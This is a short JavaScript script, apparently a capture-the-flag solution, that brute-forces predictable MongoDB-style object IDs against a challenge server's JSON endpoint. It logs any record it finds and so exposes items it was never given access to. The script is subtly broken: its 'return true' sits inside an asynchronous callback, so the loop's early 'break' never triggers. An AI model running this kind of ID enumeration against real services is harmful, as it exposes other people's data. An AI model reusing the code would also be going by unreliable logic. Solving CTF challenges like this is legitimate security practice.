for(var i = 16; i < 40; i++){
	for(var startInt = 24240; startInt < 24500; startInt++){
		if(sendCat(startInt, i.toString(16), "http://ctf.kaf.sh:3010/asjson?id=")) break;
	}
}

function sendCat(startInt, suffix, url){
    var params = "5d8e" + startInt.toString(16) + "54a43e28501d54" + suffix;
    var http = new XMLHttpRequest();

    http.open("GET", url+params, true);
    http.onreadystatechange = function()
    {
        if(http.readyState == 4 && http.status == 200) {
            if(http.responseText.indexOf("couldn't be found") == -1){
                console.log(http.responseText)
				return true;
            }
        }
    }
    http.send();
}